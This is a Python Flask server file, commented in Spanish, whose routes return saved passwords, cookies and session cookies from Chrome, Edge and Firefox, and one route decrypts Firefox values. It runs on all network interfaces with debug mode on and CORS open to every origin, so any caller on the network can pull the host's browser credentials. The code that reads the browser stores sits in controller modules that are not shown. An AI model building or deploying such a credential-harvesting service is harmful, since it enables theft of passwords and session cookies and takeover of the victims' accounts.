from flask import Flask, jsonify, request
from flask import render_template
from controllers.cookie_controller import CookieController_Firefox, CookieController_Edge, CookieController_Chrome
from flask import Flask
from flask_cors import CORS


app = Flask(__name__)
CORS(app)
controller_firefox = CookieController_Firefox()
controller_edge = CookieController_Edge()
controller_chrome = CookieController_Chrome()

# controlador de chrome
@app.route('/cookies/chrome', methods=['GET'])
def get_chrome_cookies():
    return jsonify(controller_chrome.get_chrome_cookies())

@app.route('/cookies/chrome/session', methods=['GET'])
def get_chrome_session_cookies():
    return jsonify(controller_chrome.get_session_cookies())

@app.route('/usuarios/chrome', methods=['GET'])
def obtener_contrasenias_chrome():
    return jsonify(controller_chrome.obtener_contrasenias())

@app.route('/usuarios/chrome/paginas', methods=['GET'])
def numeros_paginas_encontradas_sin_repetir_chrome():
    return jsonify(controller_chrome.numeros_paginas_encontradas_sin_repetir())


@app.route('/usuarios/chrome/top', methods=['GET'])
def top_ten_paginas_encontradas_sin_repetir_chrome():
    return jsonify(controller_chrome.top_ten_paginas_encontradas_sin_repetir())

@app.route('/usuarios/chrome/contrasenias', methods=['GET'])
def numero_contrasenias_encontradas_chrome():
    return jsonify(controller_chrome.numero_contrasenias_encontradas())

@app.route('/cookies/chrome/session/count', methods=['GET'])
def count_chrome_session_cookies():
    return jsonify(controller_chrome.count_session_cookies())

# Retorna el index
@app.route('/')
def index():
    return render_template('index.html')

    # Obtner las cookies de edge


@app.route('/cookies/edge', methods=['GET'])
def get_edge_cookies():
    return jsonify(controller_edge.get_edge_cookies())

    # Obtner las cookies de session de edge


@app.route('/cookies/edge/session', methods=['GET'])
def get_edge_session_cookies():
    return jsonify(controller_edge.get_session_cookies())

    # Contar las cookies de session de edge


@app.route('/cookies/edge/session/count', methods=['GET'])
def count_edge_session_cookies():
    return jsonify(controller_edge.count_session_cookies())

    # Obtner las cookies de firefox


@app.route('/cookies/firefox', methods=['GET'])
def get_firefox_cookies():
    return jsonify(controller_firefox.get_firefox_cookies())

    # Obtner las cookies de session de firefox


@app.route('/cookies/firefox/session', methods=['GET'])
def get_firefox_session_cookies():
    return jsonify(controller_firefox.get_session_cookies())

    # Contar las cookies de session de firefox


@app.route('/cookies/firefox/session/count', methods=['GET'])
def count_firefox_session_cookies():
    return jsonify(controller_firefox.count_session_cookies())

    # Desencriptar cookies de firefox


@app.route('/decrypt/firefox', methods=['GET'])
def decrypt_firefox():
    encrypted_value = request.args.get('encrypted_value')
    if encrypted_value is None:
        return jsonify({"error": "No se proporcionó un valor cifrado"}), 400
    result = controller_firefox.decrypt_firefox(encrypted_value)
    return jsonify(result)

 # Obtener contraseñas de firefox
@app.route('/usuarios/firefox', methods=['GET'])
def obtener_contrasenias():
    return jsonify(controller_firefox.obtener_contrasenias())

 # Obtner las cookies de edge

@app.route('/usuarios/edge', methods=['GET'])
def obtener_llave_session():
    return jsonify(controller_edge.obtener_usuario_contrasenia())

@app.route('/usuarios/edge/paginas', methods=['GET'])
def numeros_paginas_encontradas_sin_repetir():
    return jsonify(controller_edge.numeros_paginas_encontradas_sin_repetir())

@app.route('/usuarios/edge/top', methods=['GET'])
def top_ten_paginas_encontradas_sin_repetir():
    return jsonify(controller_edge.top_ten_paginas_encontradas_sin_repetir())

@app.route('/usuarios/edge/contrasenias', methods=['GET'])
def numero_contrasenias_encontradas():
    return jsonify(controller_edge.numero_contrasenias_encontradas())

if __name__ == '__main__':
    app.run(host='0.0.0.0',debug=True)
